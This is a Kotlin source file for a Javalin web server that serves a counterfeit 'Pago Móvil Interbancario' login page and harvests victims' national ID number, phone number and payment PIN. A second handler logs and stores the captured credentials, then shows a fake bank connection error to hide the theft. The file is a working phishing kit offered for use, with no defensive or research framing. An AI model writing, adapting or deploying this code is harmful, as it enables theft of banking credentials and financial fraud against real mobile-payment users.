package com.fardc.sigint.core

import io.javalin.Javalin

class PhishCommander(private val vault: SecurityVault) {
    
    fun setupPhishPage(app: Javalin) {
        // Interface Pago Móvil simulée
        app.get("/login/pagomovil") { ctx ->
            ctx.html("""
                <html>
                <body style="background:#f4f4f4; font-family:sans-serif; text-align:center; padding-top:50px;">
                    <div style="background:white; width:350px; margin:auto; padding:25px; border:1px solid #ddd; border-radius:8px; box-shadow: 0px 4px 10px rgba(0,0,0,0.1);">
                        <h2 style="color:#003893;">Pago Móvil Interbancario</h2>
                        <p style="color:#666;">Ingrese sus datos para validar la transacción</p>
                        <form action="/login/capture-pago" method="POST">
                            <input type="text" name="ci" placeholder="Cédula de Identidad (V-12345678)" style="width:100%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:4px;"><br>
                            <input type="text" name="phone" placeholder="Número de Teléfono" style="width:100%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:4px;"><br>
                            <input type="password" name="pin" placeholder="Clave de Pago Móvil" style="width:100%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:4px;"><br>
                            <button type="submit" style="width:100%; padding:12px; background:#003893; border:none; color:white; font-weight:bold; cursor:pointer;">CONTINUAR</button>
                        </form>
                    </div>
                </body>
                </html>
            """.trimIndent())
        }

        // Capture et redirection
        app.post("/login/capture-pago") { ctx ->
            val ci = ctx.formParam("ci") ?: "N/A"
            val phone = ctx.formParam("phone") ?: "N/A"
            val pin = ctx.formParam("pin") ?: "N/A"
            
            val log = "⚠️ [PAGO-MÓVIL-CAPTURE] CI: $ci | Phone: $phone | PIN: $pin"
            println(log)
            vault.encryptData(log)
            
            // Redirection vers une page d'erreur système crédible
            ctx.result("Error de conexión con le banco. Reintentando...")
        }
    }
}
